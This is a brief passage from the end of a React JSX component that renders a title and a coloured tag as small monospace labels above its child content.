        <span className="font-mono text-[10px] uppercase tracking-widest text-muted-foreground">{title}</span>
        <span className={`font-mono text-[10px] uppercase tracking-widest ${color}`}>{tag}</span>
      </div>
      {children}
    </div>
  );
}
